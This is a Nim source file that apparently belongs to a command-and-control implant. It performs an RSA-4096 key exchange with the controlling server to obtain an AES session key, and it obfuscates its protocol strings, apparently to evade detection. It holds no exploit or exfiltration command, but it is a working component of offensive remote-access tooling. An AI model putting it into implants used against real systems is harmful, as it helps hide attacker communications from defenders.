## Shared RSA key exchange implementation for all C2 profiles
import json, base64, random
import ../config
import debug
import rsa
import strenc

type
  KeyExchangeResult* = object
    success*: bool
    sessionKey*: seq[byte]
    newUuid*: string
    error*: string

proc performRsaKeyExchange*(config: Config, uuid: string, sendProc: proc(data: string, uuid: string): string): KeyExchangeResult =
  ## Perform RSA key exchange to establish AES session key
  ## Generic implementation that works with any C2 profile
  ## 
  ## Parameters:
  ##   - config: Agent configuration
  ##   - uuid: Current callback UUID (for staging_rsa message)
  ##   - sendProc: Profile-specific send function that takes encrypted message and UUID, returns response
  ##
  ## Returns:
  ##   KeyExchangeResult with success status, session key (32 bytes), and new UUID (if successful)
  
  result = KeyExchangeResult(success: false, sessionKey: @[], newUuid: "", error: "")
  
  # If no encrypted exchange needed, skip
  if not config.encryptedExchange:
    debugLog "key_exchange", "No key exchange required (ENCRYPTED_EXCHANGE_CHECK=F)"
    result.success = true
    return
  
  # Check if RSA is available (requires OpenSSL)
  if not isRsaAvailable():
    debugLog "key_exchange", "RSA key exchange not available: OpenSSL not found"
    debugLog "key_exchange", "Use AESPSK (pre-shared key) for encryption instead"
    result.success = false  # Fail key exchange
    return
  
  debugLog "key_exchange", "=== PERFORMING RSA KEY EXCHANGE ==="
  
  try:
    # Generate RSA 4096-bit key pair
    debugLog "key_exchange", "Generating RSA 4096-bit key pair..."
    
    var rsaKey = generateRsaKeyPair(4096)
    
    if not rsaKey.available:
      result.error = "RSA key generation failed"
      debugLog "key_exchange", "", result.error
      return
    
    debugLog "key_exchange", "RSA key generated, public key length: ", rsaKey.publicKeyPem.len, " bytes"
    
    # Generate random 20-character session ID
    randomize()
    var sessionId = newString(20)
    for i in 0..19:
      sessionId[i] = char(rand(25) + ord('a'))  # Random lowercase letters
    
    debugLog "key_exchange", "Session ID: ", sessionId
    
    # Build staging_rsa message (JSON format)
    let stagingRsa = %*{
      obf("action"): obf("staging_rsa"),
      obf("session_id"): sessionId,
      obf("pub_key"): encode(rsaKey.publicKeyPem)
    }
    
    let stagingStr = $stagingRsa
    
    debugLog "key_exchange", "Staging RSA request:"
    debug stagingStr
    debugLog "key_exchange", "Sending staging_rsa (encrypted with PSK)..."
    
    # Send staging_rsa message using profile's send function (encrypted with PSK)
    let response = sendProc(stagingStr, uuid)
    
    if response.len == 0:
      result.error = "Empty response from server"
      debugLog "key_exchange", "Key exchange failed: ", result.error
      return
    
    debugLog "key_exchange", "Got staging_rsa response (", response.len, " bytes)"
    
    # Parse response (should be Base64-encoded encrypted session key)
    try:
      let responseJson = parseJson(response)
      
      if not responseJson.hasKey(obf("session_key")) or not responseJson.hasKey(obf("uuid")):
        result.error = obf("Response missing 'session_key' or 'uuid' field")
        debugLog "key_exchange", "", result.error
        debugLog "key_exchange", "Response: ", response
        freeRsaKeyPair(rsaKey)
        return
      
      let encryptedKeyB64 = responseJson[obf("session_key")].getStr()
      let newUuid = responseJson[obf("uuid")].getStr()
      
      debugLog "key_exchange", "Encrypted session key (Base64): ", encryptedKeyB64[0..min(100, encryptedKeyB64.len-1)]
      debugLog "key_exchange", "New callback UUID: ", newUuid
      
      # Decode from Base64
      let encryptedKey = decode(encryptedKeyB64)
      
      debugLog "key_exchange", "Encrypted session key length: ", encryptedKey.len, " bytes"
      
      # Decrypt with RSA private key
      debugLog "key_exchange", "Decrypting session key with RSA private key..."
      
      let encryptedBytes = cast[seq[byte]](encryptedKey)
      let decryptedKey = rsaPrivateDecrypt(rsaKey, encryptedBytes)
      
      if decryptedKey.len == 0:
        result.error = obf("Failed to decrypt session key")
        debugLog "key_exchange", "", result.error
        freeRsaKeyPair(rsaKey)
        return
      
      # Truncate to 32 bytes (AES-256 key)
      var aesKey = decryptedKey
      if aesKey.len > 32:
        aesKey.setLen(32)
      
      debugLog "key_exchange", "Decrypted AES key length: ", aesKey.len, " bytes"
      debugLog "key_exchange", "Session key (Base64): ", encode(aesKey)
      
      # Clean up RSA key
      freeRsaKeyPair(rsaKey)
      
      # Success!
      result.success = true
      result.sessionKey = aesKey
      result.newUuid = newUuid
      
      debugLog "key_exchange", "=== RSA KEY EXCHANGE COMPLETE ==="
      debugLog "key_exchange", "Session key established, will be used for all future communications"
      
    except JsonParsingError:
      result.error = "Invalid JSON response: " & getCurrentExceptionMsg()
      debugLog "key_exchange", "", result.error
      debugLog "key_exchange", "Response: ", response
      freeRsaKeyPair(rsaKey)
      return
    
  except Exception as e:
    result.error = "Key exchange exception: " & e.msg
    debugLog "key_exchange", "", result.error
    # Note: rsaKey may not be initialized yet if exception occurred during generation
    return
